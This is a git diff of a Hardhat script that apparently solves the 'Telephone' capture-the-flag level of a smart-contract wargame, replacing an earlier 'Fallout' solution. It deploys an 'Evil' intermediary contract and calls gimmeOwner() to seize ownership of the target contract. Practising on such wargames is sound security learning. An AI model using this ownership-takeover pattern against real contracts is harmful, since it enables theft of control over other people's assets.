@@ -1,17 +1,18 @@
 import { ethers } from "hardhat";
-import { Fallout__factory } from "../typechain-types";
+import { Evil__factory, Telephone__factory } from "../typechain-types";
 
 async function main() {
   // Claim ownership of the contract below to complete this level.
 
   let tx; // will have to wait for each tx
   let [deployer] = await ethers.getSigners();
-  let contract = "0x9223f32d478BB579484149f9662436F3678aCE1C";
-  let fallout = new Fallout__factory(deployer).attach(contract);
+  let contract = "0xF79636A7800544B9eEf5c4e2a0B62dAf27E6B03D";
+  let telephone = new Telephone__factory(deployer).attach(contract);
+  let evil = await new Evil__factory(deployer).deploy(contract);
 
-  tx = await fallout.Fal1out();
+  tx = await evil.gimmeOwner();
   await tx.wait();
-  console.log(await fallout.owner());
+  console.log(await telephone.owner());
 }
 
 // We recommend this pattern to be able to use async/await everywhere
